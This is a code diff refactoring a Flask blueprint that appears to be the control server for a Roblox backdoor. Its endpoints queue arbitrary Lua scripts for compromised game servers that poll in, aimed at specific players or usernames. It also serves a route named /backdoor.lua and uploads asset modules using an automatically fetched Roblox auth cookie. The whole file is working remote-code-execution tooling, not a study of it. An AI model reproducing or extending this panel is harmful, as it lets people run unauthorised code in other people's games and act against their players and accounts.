@@ -1,3 +1,4 @@
+import base64
 import glob
 import json
 import os
@@ -14,20 +15,27 @@ executor = Blueprint("executor", __name__)
 users = {}
 users_players = {}
 
-module_exists = lambda module: (os.path.exists(f"{module}/id.txt") or os.path.exists(f"{module}/script.lua"))
+def module_exists(module_path):
+    return os.path.exists(f"{module_path}/id.txt") or os.path.exists(f"{module_path}/script.lua")
 
 @executor.route('/api/execute', methods=['POST'])
 def web_execute():
     userid = request.args.get("userid")
+    script = request.data.decode('utf-8')
 
-    script = request.data.decode('utf8')
+    with open(f"{PATH}/static/assets/lua/convert.lua", encoding="utf8") as convert_file:
+        convert = convert_file.read()
+    with open(f"{PATH}/static/assets/lua/functions.lua", encoding="utf8") as functions_file:
+        functions = functions_file.read()
 
-    with open(f"{PATH}/static/assets/lua/convert.lua") as f:
-        convert = f.read()
-    with open(f"{PATH}/static/assets/lua/functions.lua") as f:
-        script = f"pcall(function()local plr = game:GetService('Players'):GetPlayerByUserId({userid}){convert} {f.read()} {script} end)"
+    script = f"""pcall(function()
+local plr = game:GetService('Players'):GetPlayerByUserId({userid})
+{convert}
+{functions}
+{script}
+end)"""
 
-    if users.get(userid) != None:
+    if users.get(userid) is not None:
         users[userid].append(script)
         return "OK"
     return "NO CLIENT"
@@ -35,13 +43,17 @@ def web_execute():
 @executor.route('/api/execute_ss', methods=['POST'])
 def web_execute_ss():
     userid = request.args.get("userid")
+    script = request.data.decode('utf-8')
 
-    script = request.data.decode('utf8')
+    with open(f"{PATH}/static/assets/lua/functions.lua", encoding="utf8") as functions_file:
+        functions = functions_file.read()
 
-    with open(f"{PATH}/static/assets/lua/functions.lua") as f:
-        script = f"pcall(function(){f.read()} {script} end)"
+    script = f"""pcall(function()
+{functions}
+{script}
+end)"""
 
-    if users.get(userid) != None:
+    if users.get(userid) is not None:
         users[userid].append(script)
         return "OK"
     return "NO CLIENT"
@@ -49,24 +61,26 @@ def web_execute_ss():
 @executor.route('/api/execute_module', methods=['POST'])
 def web_execute_module():
     userid = request.args.get("userid")
-    user = request.args.get("username")
-    data = request.data.decode("utf8")
+    username = request.args.get("username")
+    module_name = request.data.decode("utf-8")
+
     script = f"""local plr = game:GetService("Players"):GetPlayerByUserId({userid})
-    local target = "{user}"
-    """
+local target = "{username}"
+"""
 
-    module = f"{PATH}/modules/{data}"
-    if module_exists(module):
-        if os.path.exists(f"{module}/script.lua"):
-            with open(f"{module}/script.lua") as f:
-                script += f.read()
-        elif os.path.exists(f"{module}/id.txt"):
-            with open(f"{module}/id.txt") as f:
-                script += f"local m = require({f.read()})\n"
-                with open(f"{PATH}/static/assets/lua/require.lua") as f:
-                    script += f.read()
+    module_path = f"{PATH}/modules/{module_name}"
+    if module_exists(module_path):
+        if os.path.exists(f"{module_path}/script.lua"):
+            with open(f"{module_path}/script.lua", encoding="utf8") as script_file:
+                script += script_file.read()
+        elif os.path.exists(f"{module_path}/id.txt"):
+            with open(f"{module_path}/id.txt", encoding="utf8") as id_file:
+                module_id = id_file.read()
+            with open(f"{PATH}/static/assets/lua/require.lua", encoding="utf8") as require_file:
+                require_script = require_file.read()
+                script += f"local m = require({module_id})\n{require_script}"
 
-    if users.get(userid) != None:
+    if users.get(userid) is not None:
         users[userid].append(script)
         return "OK"
     return "NO CLIENT"
@@ -74,16 +88,14 @@ def web_execute_module():
 @executor.route('/api/ping', methods=['GET'])
 def roblox_ping():
     userid = request.args.get("userid")
-    user = users.get(userid)
-    
-    script = []
-    if not userid in users:
+    if userid not in users:
         users[userid] = []
-    elif len(userid) > 0:
-        script = user.copy()
-        user.clear()
-    
-    return script
+
+    user_scripts = users.get(userid, [])
+    scripts_to_return = user_scripts.copy()
+    user_scripts.clear()
+
+    return scripts_to_return
 
 @executor.route('/backdoor.lua', methods=['GET'])
 def backdoor_script():
@@ -92,67 +104,63 @@ def backdoor_script():
 @executor.route('/api/players', methods=['GET', 'POST'])
 def roblox_player_ping():
     userid = request.args.get("userid")
+    session = Session(None)
+
     if request.method == 'GET':
-        if users_players.get(userid):
-            players = users_players[userid]
+        players = users_players.get(userid, {})
+        for player in players:
+            players[player]["AvatarUrl"] = session.get_pfp(players[player]["UserId"])
 
-            for player in players:
-                avatar = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={players[player]['UserId']}&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot").json()
-                if avatar["data"][0]["state"] == "Completed":
-                    players[player]["AvatarUrl"] = avatar["data"][0]["imageUrl"]
+        return render_template("players.html", players=players)
 
-            return render_template("players.html", players=players)
-        
     elif request.method == 'POST':
-        if not users.get(userid):
-            players = request.json
-            users_players[userid] = players
+        if users.get(userid) is not None:
+            users_players[userid] = request.json
             return "OK"
-        
+
     return "Connect to a server please!"
 
 @executor.route('/api/modules', methods=['GET'])
 def roblox_modules_ping():
     pinned = []
     modules = []
-
     auth_cookie = None
-    s = None
+    session = None
 
-    for module in glob.glob(f"{PATH}/modules/*"):
-        if not module_exists(module) and not os.path.exists(f"{module}/id.txt") and not module.endswith("template"):
-            if auth_cookie == None:
+    for module_path in glob.glob(f"{PATH}/modules/*"):
+        if not module_exists(module_path) and not module_path.endswith("template"):
+            with open(f"{module_path}/data.json", encoding="utf8") as data_file:
+                info = json.load(data_file)
+
+            if auth_cookie is None:
                 auth_cookie = get_cookie()
-                s = Session(auth_cookie)
-            with open(f"{module}/data.json") as f:
-                info = json.loads(f.read())
-            info["rbxmx"] = f"{module}/{info['rbxmx']}"
+                session = Session(auth_cookie)
 
-            asset_id = s.upload(info["rbxmx"], info)
-            
-            with open(f"{module}/id.txt", "w+") as f:
-                f.write(str(asset_id))
-        if module_exists(module) and not module.endswith("template"):
-            with open(f"{module}/data.json") as f:
-                info = json.loads(f.read())
-                
-            info["module"] = module.replace('\\', '/').split('/')[-1]
+            info["rbxmx"] = f"{module_path}/{info['rbxmx']}"
+            asset_id = session.upload(info["rbxmx"], info)
 
-            if info.get("pinned"):
-                pinned.append(info)
-            else:
-                modules.append(info)
-    
-    modules = [*pinned, *modules]
-    return render_template("modules.html", modules=modules)
+            with open(f"{module_path}/id.txt", "w", encoding="utf8") as id_file:
+                id_file.write(str(asset_id))
+
+        if module_exists(module_path) and not module_path.endswith("template"):
+            with open(f"{module_path}/data.json", encoding="utf8") as data_file:
+                info = json.load(data_file)
+
+            try:
+                with open(f"{module_path}/{info['image']}", "rb") as image_file:
+                    info["image"] = "data:image/png;base64," + base64.b64encode(image_file.read()).decode("utf-8")
+            except FileNotFoundError:
+                pass
+
+            info["module"] = os.path.basename(module_path)
+
+            (pinned if info.get("pinned") else modules).append(info)
+
+    return render_template("modules.html", modules=[*pinned, *modules])
 
 @executor.route('/api/close', methods=['POST'])
 def roblox_close():
-    userid = request.headers["user-id"]
-
-    if users.get(userid) != None:
-        users.pop(userid)
-    if users_players.get(userid) != None:
-        users_players.pop(userid)
-
+    userid = request.headers.get("user-id")
+    users.pop(userid, None)
+    users_players.pop(userid, None)
     return "OK"
